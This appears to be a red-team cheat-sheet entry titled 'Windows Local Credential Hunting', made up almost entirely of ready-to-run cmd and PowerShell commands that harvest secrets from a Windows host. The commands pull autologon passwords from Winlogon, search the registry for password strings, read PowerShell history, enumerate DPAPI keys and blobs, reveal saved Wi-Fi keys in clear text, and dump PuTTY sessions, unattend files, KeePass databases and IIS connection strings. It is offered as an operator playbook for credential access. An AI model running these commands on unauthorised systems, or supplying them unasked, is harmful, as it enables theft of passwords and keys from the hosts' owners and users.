---
technique: Windows Local Credential Hunting
category: credential-access
targets: Windows Workstation, Windows Server
protocols: Local
remote_capable: false
tags: windows credentials registry dpapi wifi putty unattended iis
---

# Windows Local Credential Hunting

Windows hosts often contain plaintext secrets, DPAPI blobs, saved Wi-Fi keys, unattended install files, application configs, registry values, and tool-specific credential stores. Start with low-impact discovery before dumping protected stores.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Shell access | Most commands run as the current local user |
| File visibility | Some paths require hidden-file access or administrative rights |
| Loot path | Save high-volume output to a controlled directory when needed |

## Windows

### Winlogon credentials

#cmd #registry #autologon

Search Winlogon for autologon credential values.

```cmd title:"Search Winlogon for credential values"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
```
<!-- cheat -->

### HKLM password search

#cmd #registry

Search HKLM registry string values for password references.

```cmd title:"Search HKLM registry for password strings"
reg query HKLM /f password /t REG_SZ /s
```
<!-- cheat -->

### HKCU password search

#cmd #registry

Search HKCU registry string values for password references.

```cmd title:"Search HKCU registry for password strings"
reg query HKCU /f password /t REG_SZ /s
```
<!-- cheat -->

### PowerShell history

#powershell #history

Read the current user's PSReadLine command history.

```powershell title:"Read PowerShell command history"
Get-Content (Get-PSReadLineOption).HistorySavePath
```
<!-- cheat -->

### DPAPI master keys

#powershell #dpapi

List user DPAPI master key directories.

```powershell title:"List roaming DPAPI master keys"
Get-ChildItem $env:APPDATA\Microsoft\Protect\
```
<!-- cheat -->

### DPAPI credential blobs

#powershell #dpapi

List user DPAPI credential blobs.

```powershell title:"List local DPAPI credential blobs"
Get-ChildItem -Hidden $env:LOCALAPPDATA\Microsoft\Credentials\
```
<!-- cheat -->

### Wi-Fi profiles

#cmd #wifi

List saved Wi-Fi profiles.

```cmd title:"List saved Wi-Fi profiles"
netsh wlan show profile
```
<!-- cheat -->

### Wi-Fi password

#cmd #wifi

Reveal the saved Wi-Fi key for a specific SSID.

```cmd title:"Reveal saved Wi-Fi password"
netsh wlan show profile "$ssid" key=clear
```
<!-- cheat
var ssid
-->

### PuTTY sessions

#cmd #registry #putty

Search saved PuTTY sessions for hosts, usernames, proxy settings, and key paths.

```cmd title:"Search PuTTY sessions for credential material"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername"
```
<!-- cheat -->

### Find unattended files

#cmd #unattend

Find unattended setup files that may contain local administrator credentials.

```cmd title:"Find unattended setup files"
dir /s /b C:\*sysprep.inf C:\*sysprep.xml C:\*unattended.xml C:\*unattend.xml C:\*unattend.txt 2>nul
```
<!-- cheat -->

### Find credential files

#cmd #files

Search common credential-bearing filenames across `C:\`.

```cmd title:"Find common credential-bearing files"
dir /s /b C:\*password* C:\*cred* C:\*.kdbx C:\web.config C:\unattend.xml C:\sysprep.xml 2>nul
```
<!-- cheat -->

### Find IIS web.config

#powershell #iis

Find IIS `web.config` files.

```powershell title:"Find IIS web.config files"
Get-ChildItem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
<!-- cheat -->

### Read IIS connection strings

#cmd #iis

Search the .NET framework config for connection strings.

```cmd title:"Read IIS connection strings"
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
<!-- cheat -->

## Linux

No Linux operator command is included here. This note covers local Windows credential discovery commands.
